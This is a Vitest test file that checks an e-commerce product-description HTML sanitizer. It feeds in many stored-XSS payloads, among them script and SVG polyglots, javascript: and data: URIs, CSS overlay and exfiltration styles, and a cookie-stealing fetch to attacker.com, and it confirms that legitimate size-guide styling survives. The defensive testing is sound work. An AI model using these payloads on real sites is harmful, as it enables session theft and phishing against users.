import { describe, expect, it } from "vitest";
import {
  sanitizeProductDescriptionHtml,
  PRODUCT_DESCRIPTION_SANITIZE_OPTIONS,
  ALLOWED_PRODUCT_DESCRIPTION_TAGS,
  ALLOWED_CSS_PROPERTIES,
} from "@/lib/weletic/html-sanitizer";

describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Preservation", () => {
  // =========================================================================
  // 1. ADVERSARIAL SCRIPT & POLYGLOT PAYLOAD ATTACKS
  // =========================================================================
  describe("1. Script Injection & Polyglot Payload Attacks", () => {
    it("neutralizes classic and nested unclosed script tags without executing code", () => {
      const payloads = [
        '<script>alert("xss")</script>',
        '<script src="https://evil.com/exploit.js"></script>',
        '<scr<script>ipt>alert("nested")</script>',
        '<script<script>alert("malformed")</script>',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        '<sCrIpt>alert(1)</sCrIpt>',
        '<SCRIPT/XSS SRC="http://evil.com/x.js"></SCRIPT>',
        '<script \n\r\t>alert("whitespace")</script>',
        '<script type="text/javascript">alert("typed")</script>',
        '<script type="module">import "https://evil.com/esm";</script>',
        '<script defer>alert("defer")</script>',
        '<script async>alert("async")</script>',
      ];

      for (const payload of payloads) {
        const cleaned = sanitizeProductDescriptionHtml(payload);
        // Script tags must be completely stripped
        expect(cleaned).not.toMatch(/<script/i);
        expect(cleaned).not.toMatch(/<\/script>/i);
        expect(cleaned).not.toMatch(/evil\.com/i);
        // Any remaining text must not be inside an executable tag
        expect(cleaned).not.toMatch(/<[^>]+alert/i);
      }
    });

    it("neutralizes inline SVG and vector polyglot attacks", () => {
      const polyglots = [
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><set onbegin=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        '<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>',
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle>/</titLe>/</teXtarEa>/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
      ];

      for (const polyglot of polyglots) {
        const cleaned = sanitizeProductDescriptionHtml(polyglot);
        expect(cleaned).not.toMatch(/<svg/i);
        expect(cleaned).not.toMatch(/onload\s*=/i);
        expect(cleaned).not.toMatch(/onbegin\s*=/i);
        expect(cleaned).not.toMatch(/xlink:href/i);
        // SVG and handlers must be completely absent from the DOM structure
        expect(cleaned).not.toMatch(/<[^>]*alert\(/i);
      }
    });

    it("neutralizes event handlers across all standard and exotic HTML elements", () => {
      const eventHandlers = [
        '<img src="x" onerror="alert(\'img-err\')">',
        '<img src="valid.jpg" onload="alert(\'img-load\')">',
        '<audio src="x" onerror="alert(\'audio-err\')">',
        '<video><source src="x" onerror="alert(\'video-err\')"></video>',
        '<body onload="alert(\'body-load\')">',
        '<details open ontoggle="alert(\'details-toggle\')"><summary>Click</summary></details>',
        '<marquee onstart="alert(\'marquee-start\')">Scrolling text</marquee>',
        '<div onclick="alert(\'div-click\')" onmouseover="alert(\'hover\')" onfocus="alert(\'focus\')">Content</div>',
        '<input autofocus onfocus="alert(\'autofocus\')">',
        '<select autofocus onfocus="alert(\'select\')"><option>1</option></select>',
        '<textarea autofocus onfocus="alert(\'textarea\')"></textarea>',
        '<keygen autofocus onfocus="alert(\'keygen\')">',
        '<isindex action="javascript:alert(1)">',
      ];

      for (const handler of eventHandlers) {
        const cleaned = sanitizeProductDescriptionHtml(handler);
        // Ensure no event handlers remain on any element
        expect(cleaned).not.toMatch(/\bon[a-z]+\s*=/i);
        expect(cleaned).not.toMatch(/alert\(/i);
        // Ensure non-whitelisted tags are completely eliminated
        expect(cleaned).not.toMatch(/<(?:img|audio|video|body|details|marquee|input|select|textarea|keygen|isindex)/i);
      }
    });

    it("neutralizes dangerous embedding and execution tags (iframe, object, embed, form)", () => {
      const embeddingPayloads = [
        '<iframe src="https://attacker.com/steal-creds"></iframe>',
        '<iframe src="javascript:alert(\'iframe-xss\')"></iframe>',
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        '<object data="https://attacker.com/flash.swf"></object>',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="https://attacker.com/flash.swf">',
        '<embed src="javascript:alert(1)">',
        '<form action="https://attacker.com/steal"><button type="submit">Submit</button></form>',
        '<form action="javascript:alert(1)"><button>Click</button></form>',
        '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
      ];

      for (const payload of embeddingPayloads) {
        const cleaned = sanitizeProductDescriptionHtml(payload);
        expect(cleaned).not.toMatch(/<(?:iframe|object|embed|form|math|mglyph|style)/i);
        expect(cleaned).not.toMatch(/attacker\.com/i);
        expect(cleaned).not.toMatch(/alert\(/i);
      }
    });
  });

  // =========================================================================
  // 2. DANGEROUS PROTOCOLS, OBFUSCATED SCHEMES & ENTITY ENCODINGS
  // =========================================================================
  describe("2. Dangerous Protocols & Obfuscated Schemes", () => {
    it("neutralizes javascript: pseudo-protocols with case variations, whitespace, and tabs", () => {
      const dangerousSchemes = [
        '<a href="javascript:alert(1)">Click here</a>',
        '<a href="JAVASCRIPT:alert(1)">Uppercase JS</a>',
        '<a href="JaVaScRiPt:alert(1)">Mixed Case JS</a>',
        '<a href="   javascript:alert(1)">Leading whitespace</a>',
        '<a href="\tjavascript:alert(1)">Leading tab</a>',
        '<a href="\r\njavascript:alert(1)">Leading newline</a>',
        '<a href="javascript\x00:alert(1)">Null byte</a>',
        '<a href="javascript&colon;alert(1)">HTML entity colon</a>',
        '<a href="jav&#x09;ascript:alert(1)">Tab entity in scheme</a>',
        '<a href="jav&#x0A;ascript:alert(1)">Newline entity in scheme</a>',
        '<a href="jav&#x0D;ascript:alert(1)">CR entity in scheme</a>',
        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Full decimal entity scheme</a>',
        '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">Full hex entity scheme</a>',
        '<a href="&NewLine;javascript:alert(1)">HTML5 named entity newline</a>',
      ];

      for (const scheme of dangerousSchemes) {
        const cleaned = sanitizeProductDescriptionHtml(scheme);
        expect(cleaned).not.toMatch(/href\s*=\s*["']?\s*javascript/i);
        expect(cleaned).not.toMatch(/alert\(/i);
      }
    });

    it("neutralizes data:, vbscript:, livescript:, blob:, file: and protocol-relative schemes", () => {
      const nonHttpSchemes = [
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data URI Base64</a>',
        '<a href="DATA:text/html,<script>alert(1)</script>">Data URI Plain</a>',
        '<a href="vbscript:msgbox(1)">VBScript Link</a>',
        '<a href="livescript:alert(1)">LiveScript Link</a>',
        '<a href="blob:https://evil.com/4a06bf44-6a84-484d-b94f-124b89b1c7dc">Blob URL</a>',
        '<a href="file:///etc/passwd">Local File URL</a>',
        '<a href="//attacker.com/phishing-page">Protocol Relative URL</a>',
      ];

      for (const scheme of nonHttpSchemes) {
        const cleaned = sanitizeProductDescriptionHtml(scheme);
        expect(cleaned).not.toContain("data:");
        expect(cleaned).not.toContain("vbscript:");
        expect(cleaned).not.toContain("livescript:");
        expect(cleaned).not.toContain("blob:");
        expect(cleaned).not.toContain("file:");
        expect(cleaned).not.toContain("//attacker.com");
      }
    });

    it("preserves safe HTTP, HTTPS, mailto, anchor hash and relative links while enforcing noopener noreferrer", () => {
      const safeLinks = `
        <p>Visit <a href="https://yamax.com/pages/about" target="_blank">About Yamax</a></p>
        <p>Customer Support: <a href="mailto:support@yamax.com">Email Us</a></p>
        <p>Jump to <a href="#size-guide">Size Guide Table</a></p>
        <p>Contact us at <a href="/pages/contact">Contact Page</a></p>
      `;

      const cleaned = sanitizeProductDescriptionHtml(safeLinks);
      expect(cleaned).toContain('href="https://yamax.com/pages/about"');
      expect(cleaned).toContain('href="mailto:support@yamax.com"');
      expect(cleaned).toContain('href="#size-guide"');
      expect(cleaned).toContain('href="/pages/contact"');
      expect(cleaned).toContain('rel="noopener noreferrer"');
    });
  });

  // =========================================================================
  // 3. CSS OVERLAY PHISHING, UI REDRESS & ATTRIBUTE CLOBBERING
  // =========================================================================
  describe("3. CSS Overlay Phishing, UI Redress & Attribute Clobbering", () => {
    it("neutralizes fixed, absolute positioning overlays and extreme z-index", () => {
      const overlays = [
        '<div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 99999; background: red;">Overlay</div>',
        '<div style="position: FIXED; TOP: 0; LEFT: 0; Z-INDEX: 99999;">Fixed uppercase</div>',
        '<div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999;">Absolute overlay</div>',
        '<div style="position: sticky; top: 0; z-index: 99999;">Sticky extreme z-index</div>',
        '<div style="position: sticky; z-index: 100;">Sticky z-index 100</div>',
        '<div style="position: relative; z-index: 11;">Relative z-index 11</div>',
        '<div style="position: relative; z-index: -1;">Negative z-index</div>',
        '<div style="z-index: 2147483647;">Int max z-index</div>',
      ];

      for (const overlay of overlays) {
        const cleaned = sanitizeProductDescriptionHtml(overlay);
        expect(cleaned).not.toContain("position:fixed");
        expect(cleaned).not.toContain("position: fixed");
        expect(cleaned).not.toContain("position:absolute");
        expect(cleaned).not.toContain("position: absolute");
        expect(cleaned).not.toMatch(/z-index:\s*(?:99999|9999|100|11|-1|2147483647)/);
      }
    });

    it("neutralizes Tailwind and utility class overlay injections", () => {
      const classInjections = [
        '<div class="fixed inset-0 z-50 bg-black/80 flex items-center justify-center"><p>Phishing modal</p></div>',
        '<span class="absolute top-0 left-0 w-full h-full pointer-events-none">Overlay</span>',
        '<table class="sticky top-0 z-40 bg-white"><tr><td>Sticky Table</td></tr></table>',
      ];

      for (const injection of classInjections) {
        const cleaned = sanitizeProductDescriptionHtml(injection);
        expect(cleaned).not.toContain("class=");
        expect(cleaned).not.toContain("fixed inset-0");
        expect(cleaned).not.toContain("z-50");
        expect(cleaned).not.toContain("pointer-events-none");
      }
    });

    it("neutralizes dangerous CSS properties and asset exfiltration vectors", () => {
      const cssExfiltration = [
        '<div style="background: url(\'https://attacker.com/leak.png\'); color: blue;">Leak 1</div>',
        '<div style="background-image: url(\'https://attacker.com/tracker.png\');">Leak 2</div>',
        '<div style="background: image-set(\'https://attacker.com/leak.png\' 1x);">Leak 3</div>',
        '<div style="background: u\\rl(\'https://attacker.com/leak\');">Leak 4</div>',
        '<div style="behavior: url(\'xss.htc\'); width: 100%;">HTC component</div>',
        '<div style="-moz-binding: url(\'xss.xml\');">Moz binding</div>',
        '<div style="expression(alert(1)); border: 1px solid black;">IE expression test</div>',
        '<div style="@import: url(\'https://evil.com/style.css\');">CSS import</div>',
        '<div style="cursor: url(\'https://attacker.com/evil.cur\'), auto;">Cursor hijack</div>',
        '<div style="pointer-events: none; opacity: 0;">Clickjacking layer</div>',
      ];

      for (const exfil of cssExfiltration) {
        const cleaned = sanitizeProductDescriptionHtml(exfil);
        expect(cleaned).not.toContain("attacker.com");
        expect(cleaned).not.toContain("image-set");
        expect(cleaned).not.toMatch(/style="[^"]*behavior/i);
        expect(cleaned).not.toMatch(/style="[^"]*expression/i);
        expect(cleaned).not.toContain("-moz-binding");
        expect(cleaned).not.toContain("@import");
        expect(cleaned).not.toContain("cursor");
        expect(cleaned).not.toContain("pointer-events");
        expect(cleaned).not.toContain("opacity");
      }
    });

    it("strips DOM clobbering identifiers and unauthorized HTML attributes", () => {
      const clobberingPayloads = [
        '<form id="cookie"><input id="value" value="attacker"></form>',
        '<div id="defaultProgramId" name="csrf_token">Clobber test</div>',
        '<span id="document" name="location">Clobber doc</span>',
        '<p contenteditable="true" tabindex="1" draggable="true">Editable test</p>',
        '<div data-payload="malicious-action" data-controller="exploit">Custom data</div>',
      ];

      for (const payload of clobberingPayloads) {
        const cleaned = sanitizeProductDescriptionHtml(payload);
        expect(cleaned).not.toContain('id="cookie"');
        expect(cleaned).not.toContain('id="defaultProgramId"');
        expect(cleaned).not.toContain('id="document"');
        expect(cleaned).not.toContain("contenteditable");
        expect(cleaned).not.toContain("tabindex");
        expect(cleaned).not.toContain("draggable");
        expect(cleaned).not.toContain("data-payload");
      }
    });
  });

  // =========================================================================
  // 4. YAMAX ACTIVEWEAR STANDARD STYLING PRESERVATION
  // =========================================================================
  describe("4. Yamax Activewear Standard Styling Preservation", () => {
    it("preserves Yamax Main Description & Hero Section with trademark and bold bullets", () => {
      const heroHtml = `
<p>Find the perfect balance of weightless freedom and high-impact support. Engineered with our ultra-thin Yenergy™ fabric and 40% Spandex to contour your body while keeping you cool and dry.</p>
<ul>
  <li><strong>Non-Slip Waistband</strong>: High-tension composite waist design that gently compresses the tummy and stays securely in place without sliding down.</li>
  <li><strong>Flattering Glute Contours</strong>: Elegant curved back seams designed to naturally lift, shape, and enhance your silhouette.</li>
  <li><strong>Second-Skin Support</strong>: Ultra-lightweight Yenergy™ fabric with 40% high-stretch Spandex delivers high-impact hold with a weightless feel.</li>
</ul>
      `.trim();

      const cleaned = sanitizeProductDescriptionHtml(heroHtml);

      expect(cleaned).toContain("<p>Find the perfect balance of weightless freedom and high-impact support.");
      expect(cleaned).toContain("Yenergy™ fabric");
      expect(cleaned).toContain("<ul>");
      expect(cleaned).toContain("<li><strong>Non-Slip Waistband</strong>:");
      expect(cleaned).toContain("<li><strong>Flattering Glute Contours</strong>:");
      expect(cleaned).toContain("<li><strong>Second-Skin Support</strong>:");
      expect(cleaned).toContain("40% high-stretch Spandex delivers high-impact hold with a weightless feel.</li>");
    });

    it("preserves Yamax Responsive Size Guide Table with sticky first column and horizontal scroll wrapper", () => {
      const sizeGuideHtml = `
<p><strong>Fit Tip:</strong> Fits true to size. If you are between sizes, we recommend sizing up for a more comfortable fit (all-day wear), or sizing down for extra compression (best for high-impact running).</p>
<div style="overflow-x: auto; max-width: 100%; position: relative;">
  <table style="width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 14px; text-align: center;">
    <thead>
      <tr style="border-bottom: 2px solid rgb(229, 229, 229); background-color: rgb(249, 249, 249);">
        <th style="padding: 10px; font-weight: 600; position: sticky; left: 0px; background-color: rgb(249, 249, 249); z-index: 1;">Size</th>
        <th style="padding: 10px; font-weight: 600;">Length</th>
        <th style="padding: 10px; font-weight: 600;">Flat Waist</th>
        <th style="padding: 10px; font-weight: 600;">Flat Hips</th>
        <th style="padding: 10px; font-weight: 600;">Recommended Waist</th>
        <th style="padding: 10px; font-weight: 600;">Recommended Hips</th>
      </tr>
    </thead>
    <tbody>
      <tr style="border-bottom: 1px solid rgb(234, 234, 234);">
        <td style="padding: 10px; font-weight: bold; position: sticky; left: 0px; background-color: rgb(255, 255, 255); z-index: 1;">S</td>
        <td style="padding: 10px;">84 cm</td>
        <td style="padding: 10px;">25 cm</td>
        <td style="padding: 10px;">33 cm</td>
        <td style="padding: 10px;">58 – 64 cm</td>
        <td style="padding: 10px;">80 – 86 cm</td>
      </tr>
      <tr style="border-bottom: 1px solid rgb(234, 234, 234);">
        <td style="padding: 10px; font-weight: bold; position: sticky; left: 0px; background-color: rgb(255, 255, 255); z-index: 1;">M</td>
        <td style="padding: 10px;">86 cm</td>
        <td style="padding: 10px;">27 cm</td>
        <td style="padding: 10px;">35 cm</td>
        <td style="padding: 10px;">64 – 70 cm</td>
        <td style="padding: 10px;">86 – 92 cm</td>
      </tr>
    </tbody>
  </table>
</div>
<p>Need help? <a href="/pages/contact">Contact us</a> and we'll be happy to assist.</p>
      `.trim();

      const cleaned = sanitizeProductDescriptionHtml(sizeGuideHtml);

      // Wrapper div styles
      expect(cleaned).toContain("overflow-x:auto");
      expect(cleaned).toContain("max-width:100%");
      expect(cleaned).toContain("position:relative");

      // Table formatting
      expect(cleaned).toContain("width:100%");
      expect(cleaned).toContain("border-collapse:collapse");
      expect(cleaned).toContain("margin-top:15px");
      expect(cleaned).toContain("font-size:14px");
      expect(cleaned).toContain("text-align:center");

      // Row formatting
      expect(cleaned).toContain("border-bottom:2px solid rgb(229, 229, 229)");
      expect(cleaned).toContain("border-bottom:1px solid rgb(234, 234, 234)");

      // Header sticky column
      expect(cleaned).toContain("position:sticky");
      expect(cleaned).toContain("left:0px");
      expect(cleaned).toContain("z-index:1");
      expect(cleaned).toContain("background-color:rgb(249, 249, 249)");

      // Cell sticky column
      expect(cleaned).toContain("background-color:rgb(255, 255, 255)");
      expect(cleaned).toContain("font-weight:bold");
      expect(cleaned).toContain("padding:10px");

      // Contact link
      expect(cleaned).toContain('href="/pages/contact"');
      expect(cleaned).toContain('rel="noopener noreferrer"');
    });

    it("preserves Material & Care flat list structure and proprietary fabric branding", () => {
      const materialCareHtml = `
<p><strong>Material:</strong> 60% Premium Nylon, 40% Spandex (Yenergy™ Series)</p>
<p>Fabric weight: 190g</p>
<ul>
  <li><strong>Wash:</strong> Machine wash cold with similar colors inside out</li>
  <li><strong>Dry:</strong> Tumble dry low or line dry in shade</li>
  <li><strong>Care:</strong> Do not bleach, do not iron directly on logo</li>
</ul>
      `.trim();

      const cleaned = sanitizeProductDescriptionHtml(materialCareHtml);

      expect(cleaned).toContain("60% Premium Nylon, 40% Spandex (Yenergy™ Series)");
      expect(cleaned).toContain("Fabric weight: 190g");
      expect(cleaned).toContain("<li><strong>Wash:</strong> Machine wash cold");
      expect(cleaned).toContain("<li><strong>Dry:</strong> Tumble dry low");
      expect(cleaned).toContain("<li><strong>Care:</strong> Do not bleach");
    });
  });

  // =========================================================================
  // 5. CATALOG SYNC PIPELINE SIMULATION & END-TO-END INVARIANT
  // =========================================================================
  describe("5. Catalog Sync Pipeline End-to-End Simulation", () => {
    it("disarms hostile Shopify product descriptions before Prisma database upsert", () => {
      const incomingShopifyProduct = {
        id: "gid://shopify/Product/88990011",
        title: "Yamax Flow™ High-Rise Shorts 6”",
        handle: "yamax-flow-high-rise-shorts-6",
        descriptionHtml: `
          <p>Designed for your daily low-impact flow.</p>
          <script>fetch("https://attacker.com/steal?c=" + document.cookie)</script>
          <img src="invalid" onerror="alert(document.domain)">
          <div style="position: fixed; top: 0; left: 0; z-index: 99999; background: black;">
            <a href="javascript:stealTokens()">Click here to verify</a>
          </div>
          <div style="overflow-x: auto; max-width: 100%; position: relative;">
            <table style="width: 100%; border-collapse: collapse;">
              <tr>
                <th style="position: sticky; left: 0px; z-index: 1; padding: 10px;">Size</th>
                <th style="padding: 10px;">Inseam</th>
              </tr>
              <tr>
                <td style="position: sticky; left: 0px; z-index: 1; padding: 10px;">S</td>
                <td style="padding: 10px;">6”</td>
              </tr>
            </table>
          </div>
        `,
      };

      // Simulating catalog-sync.ts product persistence logic
      const sanitizedDescription = incomingShopifyProduct.descriptionHtml
        ? sanitizeProductDescriptionHtml(incomingShopifyProduct.descriptionHtml)
        : null;

      // Assert that DB payload is free from stored XSS
      expect(sanitizedDescription).not.toContain("<script");
      expect(sanitizedDescription).not.toContain("attacker.com");
      expect(sanitizedDescription).not.toContain("onerror");
      expect(sanitizedDescription).not.toContain("position:fixed");
      expect(sanitizedDescription).not.toContain("z-index:99999");
      expect(sanitizedDescription).not.toContain("javascript:");

      // Assert that DB payload retains valid Yamax structure
      expect(sanitizedDescription).toContain("Designed for your daily low-impact flow.");
      expect(sanitizedDescription).toContain("overflow-x:auto");
      expect(sanitizedDescription).toContain("position:sticky");
      expect(sanitizedDescription).toContain("z-index:1");
      expect(sanitizedDescription).toContain("6”");
    });

    it("disarms hostile Shopify translation body_html before Prisma translation upsert", () => {
      const incomingTranslation = {
        marketKey: "jp",
        locale: "ja",
        title: "ヤマックス フロー ハイライズ ショーツ 6”",
        body_html: `
          <p>デイリーなローインパクトフローに最適。</p>
          <svg onload="alert('stored-translation-xss')"></svg>
          <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">詳細はこちら</a>
          <div class="fixed inset-0 z-50">フィッシング画面</div>
        `,
      };

      // Simulating catalog-sync.ts translation upsert logic
      const cleanBodyHtml = incomingTranslation.body_html
        ? sanitizeProductDescriptionHtml(incomingTranslation.body_html)
        : null;

      expect(cleanBodyHtml).not.toContain("<svg");
      expect(cleanBodyHtml).not.toContain("onload");
      expect(cleanBodyHtml).not.toContain("data:");
      expect(cleanBodyHtml).not.toContain("class=");
      expect(cleanBodyHtml).not.toContain("fixed");
      expect(cleanBodyHtml).toContain("デイリーなローインパクトフローに最適。");
      expect(cleanBodyHtml).toContain("詳細はこちら");
    });
  });

  // =========================================================================
  // 6. ADVERSARIAL STRESS & REDOS RESILIENCE BENCHMARK
  // =========================================================================
  describe("6. Adversarial Stress & ReDoS Resilience Benchmark", () => {
    it("processes deeply nested HTML tags without stack overflow or catastrophic delay", () => {
      const depth = 80;
      let deepPayload = "<p>Deep Test</p>";
      for (let i = 0; i < depth; i++) {
        deepPayload = `<div>${deepPayload}</div>`;
      }
      deepPayload += '<script>alert("nested-deep")</script>';

      const start = performance.now();
      const cleaned = sanitizeProductDescriptionHtml(deepPayload);
      const durationMs = performance.now() - start;

      expect(cleaned).not.toContain("<script");
      expect(cleaned).toContain("Deep Test");
      // Must execute within 100ms
      expect(durationMs).toBeLessThan(100);
    });

    it("processes large payloads (>100KB) with mixed legitimate styles and malicious tags under 200ms", () => {
      const maliciousChunk = '<div style="position: fixed; z-index: 99999;" onclick="alert(1)"><script>alert(1)</script><img src=x onerror=alert(1)></div>';
      const legitimateChunk = '<div style="position: sticky; left: 0px; z-index: 1; padding: 10px;"><strong>Size S</strong>: 84 cm</div>';

      // Repeat chunks 500 times to form >100KB of rich HTML
      const combined = (maliciousChunk + legitimateChunk).repeat(500);
      expect(combined.length).toBeGreaterThan(100000);

      const start = performance.now();
      const cleaned = sanitizeProductDescriptionHtml(combined);
      const durationMs = performance.now() - start;

      expect(cleaned).not.toContain("<script");
      expect(cleaned).not.toContain("position:fixed");
      expect(cleaned).not.toContain("z-index:99999");
      expect(cleaned).not.toContain("onerror");
      expect(cleaned).not.toContain("onclick");
      expect(cleaned).toContain("position:sticky");
      expect(cleaned).toContain("z-index:1");
      expect(cleaned).toContain("84 cm");

      // Even a large 110KB+ payload parses in less than 200ms
      expect(durationMs).toBeLessThan(200);
    });
  });
});
